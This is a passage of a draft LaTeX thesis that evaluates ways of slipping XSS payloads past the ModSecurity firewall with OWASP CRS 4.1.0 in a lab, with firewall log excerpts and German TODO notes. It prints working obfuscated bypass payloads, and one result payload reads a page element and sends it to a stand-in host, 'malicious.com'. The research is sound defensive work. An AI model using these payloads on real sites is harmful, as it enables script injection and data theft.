	Putting a template literal after an expression triggers a function call, similar to how a parameter list (comma-separated values in parentheses) triggers a function call. The previous code is equivalent to the following function call (in reality, first parameter is more than just an Array, but that is explained later).
	\begin{lstlisting}
tagFunction(['Hello ', ' ', '!'], firstName, lastName)
\end{lstlisting}
	Thus, the name before the content in backticks is the name of a function to call, the tag function.
	\cite{exploringes6/templatelit}
\end{quotation}

As the function \verb|alert| can be called with an array as first parameter, it is possible to substitute the payload with \verb|alert`XSS`|. The substitute payload might evade regex filtering that looks for a function name followed by an opening \verb|(|.
Technique by \cite{onecons/wafbypass}.


\subsubsection{eval() function}
\label{sec:eval}

JavaScript payloads that are being passed in string format can be executed using the eval function. The \verb|eval()| function will evaluate the source string given as an argument and return its completion value. \cite{js/eval}
A possible usecase for \verb|eval()| in the quest to bypass a \gls{waf} is the splitting of function names that would cause a HTTP request to get rejected by the firewall.
Looking at Listing~\ref{lst:alertXSSblocked}, it is clear that the function call \verb|alert('XSS')| is being blocked by the ModSecurity firewall using CRS 4.1.0.
To avoid a match on \verb|alert(|, it is possible to split the function call into parts \verb|al|, \verb|e| and \verb|rt('XSS')| by using string concatenation in the form of \verb|`al` + `e` + `rt('XSS')`|.
Sending the payload in this form will not cause the the desired effect, as a JavaScript interpreter will interpret the payload as a string instead of a function call to the \verb|alert()| function.
Using the \verb|eval()| function in combination with the splitted string solves this problem. Passing the string \verb|`al` + `e` + `rt('XSS')`| in the form of \verb|eval(`al` + `e` + `rt('XSS')`)| as an argument to the \verb|eval()| function will cause the string to be evaluated and interpreted. Technique inspired by \cite{onecons/wafbypass}.
The ModSecurity firewall using CRS 4.1.0. checks for usage of the function \verb|eval()| and tries to block requests containing it. An example is listed in Listing~\ref{lst:evalalertXSSblocked}.

\begin{lstlisting}[style=ruleStyle, language=XML, caption=eval(`al` + `e` + `rt('XSS')`) blocking example, label={lst:evalalertXSSblocked}]
<payload>eval(`al` + `e` + `rt('XSS')`)</payload>
<file>"rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"</file>
<fileDetails>[line "331"] [id "933160"]<fileDetails>
<MatchedData>"eval(`al`   `e`   `rt('XSS')"</MatchedData>

<file>"rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"eval("</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}

\subsubsection{function constructor}
\label{sec:functionconstructor}

When using the function \verb|eval()| (see Section~\ref{sec:eval}) causes a request to be blocked, a substitute in the form of \verb|[].constructor.constructor(`alert('XSS')`)()| is available in JavaScript.

Calling \verb|[]| will create an empty array, which is a special kind of object.
Any kind of object in JavaScript, with the exception of null prototype objects, will have a constructor property on its prototype. \cite{js/object}

The Array objects constructor can be accessed by calling \verb|.constructor| on an instance of Array, like \verb|[].constructor|. \cite{js/array}
Constructors are technically regular functions. \cite{js/constructor}
As such, they are Function objects. Function objects have a constructor themselfes, which again is called using the \verb|.constructor| notation.

Using \verb|[].constructor.constructor| will yield access to the Function() constructor.
Calling the Function() constructor directly can create functions dynamically, similar to using \verb|eval()|.
The difference being that the Function() constructor creates functions that execute in the global scope only.

The Function() constructor takes a variable count of arguments. The first $n - 1$ arguments are the \quotes{names to be used by the function as formal argument names. Each must be a string that corresponds to a valid JavaScript parameter [...]} \cite{js/function}
The last argument given to the Function() constructor is expected to be a string containing the JavaScript statements compromising the function definition. \cite{js/function}

Therefore, the afromentioned substitute for \verb|eval()| - \\ \verb|[].constructor.constructor(`alert('XSS')`)()| - \\ will create a function with the function body \verb|alert('XSS')| and call it directly.
In other words: It will call a function that calls \verb|alert('XSS')|.
Technique by \cite{onecons/wafbypass}.

A more straightforward and less obscure way of accessing the Function() contructor is to call it directly:
\begin{quote}
	\verb|Function()| can be called with or without \verb|new|. Both create a new \verb|Function| instance. \cite{js/function}
\end{quote}
Depending on the firewall configuration, a WAF might use regex filtering to detect usage of \verb|Function()|.
In this case, accessing the Function() constructor via an array object can be an alternative.

{\color{red}TODO: []['map']['constructor'] from elements talk by martin kleppe:
% https://youtu.be/p0X9UlqarCU?list=PLttm25JhpvA7V0Ol0_ryuRRR_45_L0bLH&t=1253 \\ 
% or: https://speakerdeck.com/aemkei/holyjs-3l3m3nt5?slide=92
\\ CAN USE ANY FUNCTION (MAP, FILTER, JOIN, CONSTRUCTOR...)}

\subsubsection{square bracket notation}
JavaScript provides a \quotes{square bracket notation} to access properties of an Object. It is used to access multiword properties as well as provide a way of obtaining property names as the result of an expression. \cite{js/brackets}

This \quotes{square bracket notation} allows to substitute the dot notation in a case where using the dot notation is not feasible or blocked by firewall rules.
For instance, in a payload composed using the function constructor as stated in \ref{sec:functionconstructor}, the part \\ \verb|[].constructor.constructor(`alert('XSS')`)()| can be substituted with \\ \verb|[][`constructor`][`constructor`](`alert('XSS')`)()|.


\subsubsection{string replace}
\label{sec:stringreplace}
When passing certain characters is not feasible, there is a chance they can be substituted in a string replacement strategy using the \verb|+| operator.
A part of the description of the \verb|+| operator in JavaScript states:
\begin{quote}
	The + operator is overloaded for two distinct operations: numeric addition and string concatenation. When evaluating, it first coerces both operands to primitives. ... \cite{js/+}
\end{quote}
In the process of primitive coercion, objects are converted to primitives by calling their \verb|[@@toPrimitive]()|, \verb|valueOf()| and \verb|toString()| methods in the given order. Date and Symbol objects are the only built-in objects that override the \verb|[@@toPrimitive]()| method.
Objects without an override for the \verb|[@@toPrimitive]()| method inherit \verb|valueOf| from
\\ \verb|Object.prototype.valueOf|, which returns the object itself.
Since the return value is an object, it is ignored and \verb|toString()| is called instead. \cite{js/primitiveCoercion}

In the code \verb|open + []|, \verb|open| is a built-in Function object, \verb|[]| is a built-in Array object.
In the process of primitive coercion, for both, their \verb|toString()| method is being called.
When they are joined by the \verb|+| operator, it results in a String in the form of \verb|open.toString()| concatenated with \verb|[].toString()|. The result is equal to \verb|open.toString()| (see Listing~\ref{lst:opentostring}) as \verb|[].toString()| returns an empty String.

\begin{lstlisting}[style=basicStyle, caption=open.toString() in JavaScript, label={lst:opentostring}]
function open() {
    [native code]
}
\end{lstlisting}

In JavaScript, array-like access to String objects is possible. \cite{js/stringbrackets} For example, \verb|[open+[]][0][13]| returns the character \verb|(|. \verb|[open+[]][0][14]| returns the character \verb|)|. Listing~\ref{lst:opentostringindices} visualizes open.toString() with the corresponding indices.

\begin{lstlisting}[style=basicStyle, caption=open.toString() with indices in JavaScript, label={lst:opentostringindices}]
f u n c t i o n   o p  e  n  (  )     {  \n
0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21

[  n  a  t  i  v  e     c  o  d  e  ]  \n }
22 23 24 25 26 27 28 29 30 31 32 33 34 35 36
\end{lstlisting}


\subsubsection{JSFuck}
JSFuck was created by Martin Kleppe to write any valid JavaScript with only 6 different characters. 6 different characters is close to the possible Minimum, there are suggestions to use only 5 different characters, but they have some preconditions. \cite{mk/five, tc39/pipeline}
Martin Kleppe describes JSFuck as follows:
\begin{quote}
	JSFuck is an esoteric and educational programming style based on the atomic parts of JavaScript. It uses only six different characters to write and execute code.

	It does not depend on a browser, so you can even run it on Node.js. \cite{mk/jsfuck}
\end{quote}
Encoding the payload \verb|alert(1)| in JSFuck results in following payload:
\begin{lstlisting}[style=basicStyle, caption=alert(1) in JSFuck, label={lst:alert1jsfuck}]
  (![] + [])[+!+[]] +
    (![] + [])[!+[] + !+[]] +
    (!![] + [])[!+[] + !+[] + !+[]] +
    (!![] + [])[+!+[]] +
    (!![] + [])[+[]] +
    ([][
      (![] + [])[+[]] +
        (![] + [])[!+[] + !+[]] +
        (![] + [])[+!+[]] +
        (!![] + [])[+[]]
    ] + [])[+!+[] + [!+[] + !+[] + !+[]]] +
    [+!+[]] +
    ([+[]] +
      ![] +
      [][
        (![] + [])[+[]] +
          (![] + [])[!+[] + !+[]] +
          (![] + [])[+!+[]] +
          (!![] + [])[+[]]
      ])[!+[] + !+[] + [+[]]],
\end{lstlisting}

This payload is 297 characters long, which is around 37 times more than the 8 characters forming \verb|alert(1)|. On usage of JSFuck, payload size increases dramatically. Encoding the payload \verb|alert('XSS')| already requires 5739 characters (see Listing~\ref{lst:alertxssjsfuck}). If payload size is not limited, a lot of obscuration can be gained by using JSFuck to obscure payloads. The JSFuck website provides an encoder that is ready to use. It supports evaluating the source such that no additional measure is needed to execute the payload. \cite{mk/jsfuck}


\subsubsection{Aurebesh.js}
Similar to JSFuck, Aurebesh.js was created by Martin Kleppe. In its minimalistic form, it allows to write a valid JavaScript function calling \verb|alert(1)| with the characters \verb|() + [] ! " = {}| as well as one other character of choice. Aurebesh.js allows the choice of up to 9 distinct characters or words. In the case where the characters \verb|A B C D E F G H I| are chosen, the system is explained as follows:
\begin{lstlisting}[style=basicStyle, caption=Aurebesh.js explanation \cite{mk/aurebesh}, label={lst:aurebeshexplanation}]
		A = ''              // empty string
		B = !A + A          // "true"
		C = !B + A          // "false"
		D = A + {}          // "[object Object]"
		E = B[A++]          // "t" = "true"[0]
		F = B[G = A]        // "r" = "true"[1]
		H = ++G + A         // 2, 3
		I = D[G + H]        // "c"

		B[
		  I +=              // "c"
		    D[A] +          // "o" = "object"[0]
		    (B.C+D)[A] +    // "n" = "undefined"[1]
		    C[H] +          // "s" = "false"[3]
		    E +             // "t"
		    F +             // "r"
		    B[G] +          // "u" = "true"[2]
		    I +             // "c" = "[object]"[5]
		    E +             // "t"
		    D[A] +          // "o" = "[object]"[1]
		    F               // "r"
		][
		  I                 // "constructor"
		](
		  C[A] +            //  "a"
		  C[G] +            //  "l"
		  B[H] +            //  "e"
		  F +               //  "r"
		  E +               //  "t"
		  "(A)"             // "(1)"
		)()
\end{lstlisting}
If less than 9 characters (or words) are supplied, Aurebesh.js will reuse some characters by concatenating them together to create 9 different variables. \cite{mk/aurebesh}

In contrast to the author who is pursuing the translation of JavaScript into other writing systems, antagonist actors might use this idea to translate \gls{xss} payloads that are blocked by a Web application firewall into \gls{xss} payloads that bypass Web application firewalls. Antagonist actors are not limited to just using 9 variables when crafting \gls{xss} payloads using Aurebesh.js. They can use Aurebesh.js as a base for their payloads while adding more characters and variables as needed.
The obfuscation gained by using Aurebesh.js might make payloads evade detection while the added payload content maliciously influences the Web application.
As a proof of concept, the function \verb|alert| has been substituded with the function \verb|prompt| in the following example:

\begin{lstlisting}[style=basicStyle, caption=Aurebesh.js obfuscation of prompt, label={lst:aurebeshprompt}]
		A = ''              // empty string
		B = !A + A          // "true"
		C = !B + A          // "false"
		D = A + {}          // "[object Object]"
		E = B[A++]          // "t" = "true"[0]
		F = B[G = A]        // "r" = "true"[1]
		H = ++G + A         // 2, 3
		I = D[G + H]        // "c"

		B[
		  I +=              // "c"
		    D[A] +          // "o" = "object"[0]
		    (B.C+D)[A] +    // "n" = "undefined"[1]
		    C[H] +          // "s" = "false"[3]
		    E +             // "t"
		    F +             // "r"
		    B[G] +          // "u" = "true"[2]
		    I +             // "c" = "[object]"[5]
		    E +             // "t"
		    D[A] +          // "o" = "[object]"[1]
		    F               // "r"
		][
		  I                 // "constructor"
		](
		  'p' +             // "p"
		  F +               // "r"
		  D[A] +            // "o"
		  'm' +             // "m"
		  'p' +             // "p"
		  E +               // "t"
		  '(A,++A)'         // "(1,2)"
		)()
\end{lstlisting}

For the test result of this payload see Listing~\ref{lst:aurebeshpromptbypass}.

{\color{red} evtl hier noch eine weitere, interessantere payload (fetch)}


	\newpage
	\section{Evaluation methodology}
\label{sec:evaluation}
To bypass a waf, firewall-evasion techniques are discussed and evaluated against the modsecurity firewall with crs 4 {\color{red} TODO, den ersten satz nochmal überarbeiten}

Requests are being sent as a html body as well as a query param.

Black Box testing methodology, but allowed access to logs in order to be more efficient with finding bypassing payloads. Idea: be an attacker with an advantage (use similar resources to an attacker and mimic a real scenario, but save time and test thoroughly[target: test the waf, so its smart to try and circumvent the rules] through knowing the rules). doing blackbox test alone would risk missing some bypasses that can be created using an approach that allows access to firewall logs. it would propose security through obscurity

All tests have been conducted in a lab environment composed of simple web servers to receive requests that pass the firewall.
The web servers are reachable via an nginx reverse proxy that is compiled with the ModSecurity-nginx connector module. Nginx runs on a Debian Bookworm host with ModSecurity installed.
All components are built from source from their latest mainline branches as of April 2024.
For more details see the attached Dockerfiles.
	{\color{red} sollte ich die Dockerfiles hier erwähnen und anängen?}
ModSecurity is configured using the authors recommended configuration by the time of this writing. \cite{modsec/recconf}
Adjustments were made such that hits on potentially malicious requests are logged and the requests are being blocked. The response body is not being filtered.
The configured ruleset is the OWASP CoreRuleSet in version 4.1.0 from 21/03/2024. \cite{crs/410dl}


	\newpage
	\section{Evaluation Results}
\label{sec:EvaluationResults}
Combination of <a> with javascript in href injection, HTML ascii encoding, tagged template literals (line breaks for readability)
\begin{lstlisting}[style=basicStyle]
	<a href=j&#97v&#97script&#x3A;
	var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;
	var&#32data&#32=&#32&#123body:secret,method:'POST'\};
	fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data\}`>ClickMeFor$</a>
\end{lstlisting}

\begin{itemize}
	\item Using function constructor to evade eval() detection
	\item supplying the argument via tagged template literal to avoid () characters
	\item the 'a' in front of the template in the template string to avoid an error that is thrown if the first parameter in a multi parameter call to the function constructor is not a valid javascript parameter
	\item using string replace to avoid supplying the full sequence of 'alert' and to replace () characters
\end{itemize}

theoretically a payload without () is possible like this but it turns out that passing a template literal string with \verb|${...}| syntax is being flagged as unix command injection

\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}


tried to encode the  payload:
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	[][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `XSS` + [`"`][0] + [open + []][0][14]}```
\end{lstlisting}
with unicode and html, even the weird unicode. but the modsecurity waf decodes both and blocks TODO

weird unicode: tried using 
\begin{lstlisting}[style=basicStyle, caption=Payload inspired by \cite{onecons/wafbypass}]
	console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))

	but result is 
{\t\"test2\": \"[][`constructor`][`constructor`]`a__{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`\"`][0]+`Oneconsult`+[`\"`][0]+[open+[]][0][14]}```\"}
\end{lstlisting}


unicode tests:
\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:unicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>

<payload>encodeURIComponent('`\u0024{`alert`}')</payload>
<payload>"%60%24%7B%60alert%60%7D"</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"eval("</MatchedData>
\end{lstlisting}



	\subsection{Single Iteration Evaluation}
\label{sec:singleiterationeva}
This chapter states the evaluation results of a single iteration of application of an evasion technique to the specified payloads. If a considerable (from the perspective of the author of this work) bypass was found, the result will be detailed. Evaluation results of blocked requests are not further investigated.


\subsubsection{Payload length}
\label{sec:paylensingleiter}
As stated in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked by the tested firewall:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert('XSS'), label={lst:alertXSSblocked}]
<payload>alert('XSS')</payload>
<message>"Javascript method detected"</message>
<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

Filling the request with filler data in the form: \\
\verb|/**aa..a**/alert('XSS')| \\
will cause the request to be blocked by ModSecurity without matching on any CoreRuleSet rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=request body bigger than maximum, label={lst:requesttoobig}]
<payload>/**aaa...(131052 more a)**/alert('XSS')</payload>
<message>"Failed to parse request body."</message>
<file>"/nginx/modsecurity.d/modsecurity.conf"</file>
<fileDetails>[line "76"] [id "200002"]<fileDetails>
<MatchedData>"Request body excluding files is bigger than the maximum expected."</MatchedData>
\end{lstlisting}

It takes exactly 131073 1-byte characters to reach this limit. If one less character is used in the request body, the ModSecurity firewall will match on \verb|alert(|, like in Listing~\ref{lst:alertXSSblocked}. This corresponds to the 131072 limit with rejection by default on exceeding the limit stated in the ModSecurity configuration file.


\subsubsection{Unicode encoding in JSON}
\label{sec:unicodeinjsontest}
The ModSecurity firewall detects and blocks requests containing \verb|${| followed by a closing \verb|}| after an arbitrary number of characters in between.
Tests have shown that using Unicode encoding in JSON and substituting the \verb|$| in a JSON request with \verb|\u0024| evades the previously mentioned detection, but triggers another firewall rule: \\
\verb|Possible Unicode character bypass detected|:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=unicode tests \$\{`alert`\}, label={lst:jsonunicodetests}]
<payload>${`alert`}</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${`alert`}"</MatchedData>

<payload>\u0024{alert`}</payload>
<message>"Possible Unicode character bypass detected"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1263"] [id "920540"]<fileDetails>
<MatchedData>"x5cu0024"</MatchedData>
\end{lstlisting}

\subsubsection{Unicode Normalization}
\label{sec:uninormsingleiter}
The following payload using the function \verb|alert()| is being blocked by the ModSecurity Firewall using CRS 4.1:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertnormalizemeblocked]
<payload>alert("normalizeMe")</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

If the opening \verb|(| is substituted with the "Superscript Left Parenthesis" (U+207D), the payload bypasses the filter:

\begin{lstlisting}[style=basicStyle, caption=alert('normalizeMe') bypass, label=lst:alertnormalizemebypass]
alert\u{207D}'normalizeMe')
\end{lstlisting}

Calling \verb|.normalize('NFKD')| on the bypassed string:

\begin{lstlisting}[style=basicStyle]
"alert\u{207D}'normalizeMe')".normalize('NFKD')
\end{lstlisting}

will convert the string to the original payload:

\begin{lstlisting}[style=basicStyle]
"alert('normalizeMe')"
\end{lstlisting}

As such, this payload would be a valid bypass on web applications that normalize payloads on incoming requests using the NFKD or another normalization algorith that normalizes the payload equally.


\subsubsection{Case Alternation}
\label{sec:casealternationevaluation}
As seen in Listing~\ref{lst:alertXSSblocked}, the payload \verb|alert('XSS')| is being blocked. Similarly, the payload \verb|aLeRT('XSS')| is being blocked by the ModSecurity Firewall using CRS4.1.:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=alert("normalizeMe") blocked, label=lst:alertcasealternationblocked]
<payload>aLeRT('XSS')</payload>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"aLeRT("</MatchedData>
<message>"Javascript method detected"</message>
\end{lstlisting}

The specific warning that the firewall writes to its log on blocking the case-alternated payload gives a reason as to why the payload is being filtered:
\begin{lstlisting}[style=basicStyle, caption=ModSecurity warning on case alternated payloads, label={lst:modsecwarning}]
	ModSecurity: Warning. Matched "Operator `Rx' with parameter `(?i)\b(?:eval|set(?:timeout|interval)|new[\s\x0b]+Function|a(?:lert|tob)|btoa|prompt|confirm)[\s\x0b]*\('
\end{lstlisting}
The \verb|(?i)| regex modifier at the beginning of the rule instructs the regex engine to ignore case.


% \subsubsection{Comment Interference}
% {\color{red}TODO XSS comment interference}
% The example given by Ally Petitt \cite{medium/allypetitt} in Section~\ref{sec:commint} has been tested against the ModSecurity Firewall using CRS4.1. The original payload: \verb|?id=1+union+select+1,2,3--| is being blocked by the firewall:
%
% \begin{lstlisting}[style=ruleStyle, language=XML, caption=union select injection blocked, label=lst:sqliblocked]
% <payload>?id=1+union+select+1,2,3--</payload>
%
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "205"] [id "942190"]<fileDetails>
% <MatchedData>"union select"</MatchedData>
% <message>"Detects MSSQL code execution and information gathering attempts"</message>
%
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "469"] [id "942360"]<fileDetails>
% <MatchedData>"1 union select"</MatchedData>
% <message>"Detects concatenated basic SQL injection and SQLLFI attempts"</message>
% \end{lstlisting}
%
% Similarly, the modified payload using Comment Interference: \verb|?id=1+un/**/ion+sel/**/ect+1,2,3--| is detected and blocked:
%
% \begin{lstlisting}[style=ruleStyle, language=XML, caption=Comment Interference in SQL blocked, label=lst:commentinterferenceinsqlblocked]
% <payload>?id=1+un/**/ion+sel/**/ect+1,2,3--</payload>
% <file>"/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"</file>
% <fileDetails>[line "205"] [id "942190"]<fileDetails>
% <MatchedData>"union select"</MatchedData>
% <message>"Detects MSSQL code execution and information gathering attempts"</message>
% \end{lstlisting}
%
% The fact that the ModSecurity Firewall using CRS4.1 blocks this specifically crafted payload does not proof that using Comment Interference will never make payloads bypass the firewall. No more research was conducted into this idea, therefore Comment Interference is not being considered when crafting bypassing payloads in multiple steps in the following section.
%

\subsubsection{Percent Encoding}
\label{sec:percencsingleiter}
The ModSecurity firewall detects some percent-encoded payloads. Requests with plain as well as percent-encoded payloads were sent to the reverse proxy. All requests triggered the same rules:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=url encoded example blocked, label={lst:urlencodedexampleblocked}]
<payload>alert(`${new Date()}`)</payload>
<payload>urllib.parse.quote_plus('alert(`${new Date()}`)')</payload>
<payload>'alert%28%60%24%7Bnew+Date%28%29%7D%60%29'</payload>
<message>"Remote Command Execution: Unix Shell Expression Found"</message>
<file>"/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf"</file>
<fileDetails>[line "291"] [id "932130"]<fileDetails>
<MatchedData>"${new date()}"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "714"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

Many rules that are delivered as part of the CoreRuleSet in version 4.1 use the \verb|t:urlDecode| or \verb|t:urlDecodeUni| transformations that transforms a filtered request by url decoding input strings before checking for rule matches. Therefore, using percent (url-) encoding to try and bypass a firewall equipped with rules from CRS4.1 is considered futile.

\subsubsection{Charset Alternation}
\label{sec:charaltsingleiter}
The ModSecurity firewall using CRS4.1 blocks the payload:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=charset alternation example blocked, label={lst:charsetaltexampleblocked}]
<payload>"<script>alert("xss")</script>"</payload>

<message>"XSS Attack Detected via libinjection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "116"] [id "941100"]<fileDetails>
<MatchedData>"<script>alert(\x22xss\x22)</script>"</MatchedData>

<message>"XSS Filter - Category 1: Script Tag Vector"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "142"] [id "941110"]<fileDetails>
<MatchedData>"<script>"</MatchedData>

<message>"NoScript XSS InjectionChecker: HTML Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "234"] [id "941160"]<fileDetails>
<MatchedData>"<script"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "748"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

after encoding the payload to \verb|UTF-16|, the payload:

\begin{lstlisting}[style=basicStyle]
\xff\xfe<\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00a\x00l\x00e\x00r\x00t\x00(\x00'\x00x\x00s\x00s\x00'\x00)\x00<\x00/\x00s\x00c\x00r\x00i\x00p\x00t\x00>\x00
\end{lstlisting}

successfully evades the filtering of the firewall. In order to for this payload to have any effect, the Web server receiving the HTTP request containing this payload needs to be informed that this payload is encoded in \verb|UTF-16|. For that purpose, the HTTP header: \\
\verb|Content-Type: text/html; charset=utf-16| is added to the request.

The ModSecurity firewall using CRS4.1 does not allow specifying \verb|UTF-16| as charset in the \verb|Content-Type| header:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=utf-16 charset header blocked, label={lst:utf16charsetheaderblocked}]
<payload>-H 'Content-Type: text/html; charset=utf-16'</payload>

<message>"Request content type charset is not allowed by policy"</message>
<file>"/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf"</file>
<fileDetails>[line "1021"] [id "920480"]<fileDetails>
<MatchedData>"utf-16"</MatchedData>
\end{lstlisting}

The firewall log further states that the firewall 

\begin{quote}
	Matched "Operator `Within' with parameter `|utf-8| |iso-8859-1| |iso-8859-15| |windows-1252|' against variable `TX:content\_type\_charset'
\end{quote}

Subsequently, every encoding permitted by this rule has been tested with the initial payload. There is no difference between the string in any of the allowed encodings. As it seems, the byte representation of first 127 characters is equal between all tested encodings. \cite{enc/diffa, enc/diffb, enc/diffc} Therefore, none of the allowed encodings can be used to create a bypassing payload from the initial payload. 


\subsubsection{HTML character references}
\label{sec:htmlcharrefsingleeva}
The example payload mentioned under Section~\ref{sec:htmlcharreftech} has been tested against the ModSecurity firewall using CRS4.1:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=stored xss injection blocked, label={lst:storedxssinjblocked}]
<payload><a href=javascript:alert('a')>ClickMeFor$</a></payload>

<message>"NoScript XSS InjectionChecker: Attribute Injection"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "259"] [id "941170"]<fileDetails>
<MatchedData>"javascript:alert('a')>ClickMeFor$<"</MatchedData>

<message>"IE XSS Filters - Attack Detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "357"] [id "941210"]<fileDetails>
<MatchedData>"javascript:a"</MatchedData>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
<fileDetails>[line "748"] [id "941390"]<fileDetails>
<MatchedData>"alert("</MatchedData>
\end{lstlisting}

On escaping the first \verb|a| in \verb|javascript:| using the HTML hex character reference, the payload becomes:

\begin{lstlisting}[style=basicStyle, language=Python, escapeinside=\^\^]
<a href=jav^\&\#x61^;script:alert('a')>ClickMeFor$</a>
\end{lstlisting}

This payload bypasses the rules with ids \verb|941170| (NoScript XSS InjectionChecker: Attribute Injection) and \verb|941210|(IE XSS Filters - Attack Detected). 

As this result is promising, another iteration of applying this technique has been used in the multi iteration evaluation. The results are stated unter Section~\ref{sec:doublehtmlcharref}.

\subsubsection{From charcode}
\label{sec:charcodesingleiter}
As stated under Section~\ref{sec:fromcharcodetech}, a payload where the string containing malicious JavaScript statements was substituted by a call to \verb|String.fromCharCode()| was tested against the ModSecurity firewall using CRS4.1:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=fromCharCode blocked, label={lst:fromcharcodeblocked}]
<payload>String.fromCharCode(^0x61,108,0x65,114,116,0x28,96,120,115,115,0x60,0x29^)</payload>

<message>"Node.js Injection Attack 1/2"</message>
<file>"/rules/REQUEST-934-APPLICATION-ATTACK-GENERIC.conf"</file>
<fileDetails>[line "52"] [id "934100"]<fileDetails>
<MatchedData>"String.fromCharCode"</MatchedData>
\end{lstlisting}

This rule matches on the character sequence \verb|String.fromCharCode| while this evasion technique depends on using this function. Further use of this technique would require to split the statement into a minimum of two parts. Section~\ref{sec:charcodemultiiter} follows up on this idea. In a single iteration, the firewall effectively prohibits payloads obscured using this technique.

\subsubsection{String concatenation}
\label{sec:stringconcsingleiter}
The example payload mentioned under Section~\ref{sec:stringconc}:

\begin{lstlisting}[style=basicStyle, language=Python]
"alert('concatenation')"
\end{lstlisting}

was used to evaluate the tested firewall against this evasion technique. The ModSecurity firewall using CRS4.1 blocks requests containing this payload according to the following rule:

\begin{lstlisting}[style=ruleStyle, language=XML, caption=fromCharCode blocked, label={lst:fromcharcodeblocked}]
<payload>"alert('concatenation')"</payload>

<message>"Javascript method detected"</message>
<file>"/rules/REQUEST-941-APPLICATION-ATTACK-XS"</file>
